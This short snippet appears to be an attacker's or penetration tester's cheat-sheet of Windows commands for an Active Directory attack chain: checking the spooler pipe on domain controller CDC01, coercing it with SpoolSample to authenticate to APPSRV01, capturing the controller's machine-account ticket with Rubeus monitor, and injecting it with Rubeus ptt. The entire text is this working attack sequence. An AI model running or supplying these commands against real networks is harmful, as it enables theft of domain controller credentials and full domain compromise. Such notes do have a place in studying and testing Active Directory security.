```
in ps: dir \\cdc01\pipe\spoolss
SpoolSample.exe CDC01 APPSRV01
Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
Rubeus.exe ptt /ticket:doIFIjC...
```
